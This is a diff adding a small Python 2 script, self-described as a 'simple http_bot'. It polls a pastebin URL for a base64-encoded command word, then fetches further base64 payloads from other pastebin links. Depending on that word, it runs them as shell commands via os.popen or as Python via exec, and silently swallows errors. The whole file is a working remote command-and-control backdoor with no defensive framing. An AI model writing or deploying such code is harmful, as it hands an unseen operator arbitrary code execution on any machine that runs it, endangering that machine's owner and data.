@@ -1,0 +1,36 @@
+#coding: utf-8
+#simple http_bot
+import urllib
+import base64
+import os
+
+def sos():
+    url = 'https://pastebin.com/raw/05p0fTYd'
+    try:
+        page=base64.b64decode(urllib.urlopen(url).read())
+        f = os.popen(str(page))
+    except:
+        print('failed to execute os command')
+        pass
+
+def runScript():
+    url = 'https://pastebin.com/raw/KxWPFeEn'
+    try:
+        page=base64.b64decode(urllib.urlopen(url).read())
+        exec(page)
+    except:
+        print('failed to execute os python script')
+        pass
+
+d= 'https://pastebin.com/raw/X6wvuv98'
+try:
+    page=base64.b64decode(urllib.urlopen(d).read())
+    if page == 'os':
+        sos()
+    elif page == 'script':
+        runScript()
+    else:
+        print('I can\'t understand the action am given')
+except:
+    print('Sorry boss I can\'t get instructions')
+    pass
